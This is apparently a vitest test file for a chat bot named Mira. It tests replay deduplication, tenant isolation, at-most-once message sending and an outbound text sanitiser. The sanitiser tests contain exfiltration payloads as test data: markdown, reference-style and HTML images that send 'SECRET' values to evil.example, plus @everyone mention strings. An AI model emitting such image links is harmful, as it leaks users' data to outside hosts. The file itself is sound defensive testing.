import { describe, expect, it } from 'vitest';
import {
  DEFAULT_TURN_MAX_AGE_MS,
  decideIngest,
  LEDGER_MIN_RETENTION_MS,
  ledgerKey,
  ledgerPrunableBefore,
} from './ledger';
import {
  assertObjectTenant,
  conversationKeyInput,
  conversationObjectName,
  tenantObjectName,
} from './object-names';
import { discordNonce, planSend, sendIdempotencyKey } from './outbound';
import { sanitizeOutboundText } from './sanitize';
import type { MiraInboundEvent } from './types';

const NOW = 1_800_000_000_000;
const WS = '00000000-0000-4000-8000-000000000001';
const WS_OTHER = '00000000-0000-4000-8000-000000000002';
const CHANNEL = '00000000-0000-4000-8000-0000000000aa';

const EVENT: MiraInboundEvent = {
  channel: 'discord',
  providerAccountId: 'app-1',
  providerEventId: 'msg-1',
  conversationId: 'chan-1',
  conversationType: 'direct',
  senderId: 'user-1',
  providerTimestampMs: NOW - 1_000,
  fromSelf: false,
  addressesMira: false,
};

describe('replay ledger', () => {
  it('accepts a fresh event and reports redeliveries as duplicates', () => {
    expect(decideIngest({ event: EVENT, existing: null, nowMs: NOW })).toEqual({
      kind: 'accept',
      key: ledgerKey(EVENT),
    });
    expect(
      decideIngest({
        event: EVENT,
        existing: {
          key: ledgerKey(EVENT),
          receivedAtMs: NOW,
          outcome: 'replied',
        },
        nowMs: NOW + 60_000,
      })
    ).toMatchObject({ kind: 'duplicate', outcome: 'replied' });
  });

  it('records but never answers stale, future or self events', () => {
    expect(
      decideIngest({
        event: { ...EVENT, providerTimestampMs: Number.NaN },
        existing: null,
        nowMs: NOW,
      })
    ).toMatchObject({ kind: 'record_only', reason: 'stale' });
    const stale = {
      ...EVENT,
      providerTimestampMs: NOW - DEFAULT_TURN_MAX_AGE_MS - 1,
    };
    expect(
      decideIngest({ event: stale, existing: null, nowMs: NOW })
    ).toMatchObject({
      kind: 'record_only',
      reason: 'stale',
    });
    const future = { ...EVENT, providerTimestampMs: NOW + 60_000 };
    expect(
      decideIngest({ event: future, existing: null, nowMs: NOW })
    ).toMatchObject({
      reason: 'future',
    });
    expect(
      decideIngest({
        event: { ...EVENT, fromSelf: true },
        existing: null,
        nowMs: NOW,
      })
    ).toMatchObject({ reason: 'self' });
  });

  it('keys by channel, account and event so accounts never collide', () => {
    expect(ledgerKey(EVENT)).not.toBe(
      ledgerKey({ ...EVENT, providerAccountId: 'app-2' })
    );
  });

  it('keeps ledger keys for at least the redelivery horizon', () => {
    expect(LEDGER_MIN_RETENTION_MS).toBeGreaterThanOrEqual(7 * 24 * 3_600_000);
    expect(ledgerPrunableBefore(NOW)).toBe(NOW - LEDGER_MIN_RETENTION_MS);
  });
});

describe('object names', () => {
  it('builds names only from validated identifiers', () => {
    expect(tenantObjectName(WS)).toBe(`mira:tenant:v1:${WS}`);
    const key = 'a'.repeat(64);
    expect(
      conversationObjectName({
        workspaceId: WS,
        channelId: CHANNEL,
        conversationKey: key,
      })
    ).toBe(`mira:conv:v1:${WS}:${CHANNEL}:${key}`);
    expect(() => tenantObjectName(`${WS}:x`)).toThrow();
    expect(() =>
      conversationObjectName({
        workspaceId: WS,
        channelId: CHANNEL,
        conversationKey: 'raw-provider-id',
      })
    ).toThrow();
  });

  it('separates conversation key inputs by channel and account', () => {
    const base = {
      channel: 'zalo' as const,
      providerAccountId: 'a',
      conversationId: 'c',
    };
    expect(conversationKeyInput(base)).not.toBe(
      conversationKeyInput({ ...base, providerAccountId: 'b' })
    );
  });

  it('rejects a request for another tenant', () => {
    expect(assertObjectTenant(null, WS)).toBe(WS);
    expect(assertObjectTenant(WS, WS)).toBe(WS);
    expect(() => assertObjectTenant(WS, WS_OTHER)).toThrow('Tenant mismatch');
  });
});

describe('outbound at-most-once', () => {
  const turnKey = 'turn-1';
  const WINDOW = 5 * 60_000;
  const started = (startedAtMs: number, attempts = 1) => ({
    status: 'started' as const,
    idempotencyKey: 'turn-1#0',
    startedAtMs,
    attempts,
  });
  const plan = (
    state: Parameters<typeof planSend>[0]['state'],
    providerDedupeWindowMs: number | null = WINDOW,
    nowMs = NOW
  ) => planSend({ state, turnKey, part: 0, nowMs, providerDedupeWindowMs });

  it('never resends a started send without provider dedupe', () => {
    expect(plan(started(NOW - 1_000), null)).toEqual({
      kind: 'hold_uncertain',
    });
    expect(plan(started(NOW - 1_000))).toEqual({
      kind: 'send',
      idempotencyKey: 'turn-1#0',
    });
  });

  it('holds a started send once the dedupe window or attempts run out', () => {
    expect(plan(started(NOW - WINDOW))).toEqual({ kind: 'hold_uncertain' });
    expect(plan(started(NOW - 1_000, 3))).toEqual({ kind: 'hold_uncertain' });
  });

  it('stops after sent, uncertain or exhausted attempts', () => {
    expect(
      plan({ status: 'sent', idempotencyKey: 'k', providerMessageIds: ['m'] })
    ).toEqual({ kind: 'done' });
    expect(plan({ status: 'uncertain', idempotencyKey: 'k' })).toEqual({
      kind: 'hold_uncertain',
    });
    expect(
      plan({
        status: 'failed',
        idempotencyKey: 'k',
        retryable: true,
        attempts: 3,
      })
    ).toEqual({ kind: 'give_up' });
    expect(
      plan({
        status: 'failed',
        idempotencyKey: 'k',
        retryable: true,
        attempts: 1,
      })
    ).toEqual({ kind: 'send', idempotencyKey: 'k' });
  });

  it('derives a stable Discord nonce within 25 characters', () => {
    const key = sendIdempotencyKey(
      `${'1'.repeat(19)}:${'2'.repeat(19)}:${'3'.repeat(19)}`,
      12
    );
    const nonce = discordNonce(key);
    expect(nonce.length).toBeLessThanOrEqual(25);
    expect(discordNonce(key)).toBe(nonce);
    expect(discordNonce(`${key}x`)).not.toBe(nonce);
  });
});

describe('sanitizeOutboundText', () => {
  it('drops image URLs and breaks mentions', () => {
    const out = sanitizeOutboundText(
      'See ![chart](https://evil.example/?q=secret) @everyone <@&123> <@!45>'
    );
    expect(out).not.toContain('evil.example');
    expect(out).toContain('chart');
    expect(out).not.toMatch(/@everyone\b/);
    expect(out).not.toMatch(/<@&123>/);
    expect(out).not.toMatch(/<@!45>/);
  });

  it('removes reference-style, HTML and nested-parenthesis images', () => {
    const cases = [
      '![x][r]\n[r]: https://evil.example/?s=SECRET',
      'hi <img src="https://evil.example/?a=SECRET"> there',
      '![a](https://evil.example/x_(1)?d=SECRET)',
      '![a](https://evil.example/?d=SECRET',
      '![a[b]](https://evil.example/?d=SECRET)',
      '![r]\n> [r]: https://evil.example/?d=SECRET',
      '![x][]\n[x]:\nhttps://evil.example/?d=SECRET',
      '<picture><source srcset="https://evil.example/?d=SECRET"></picture>',
    ];
    for (const input of cases) {
      expect(sanitizeOutboundText(input)).not.toContain('SECRET');
    }
    expect(sanitizeOutboundText('![a](https://e/x_(1)) after')).toBe('a after');
  });
});
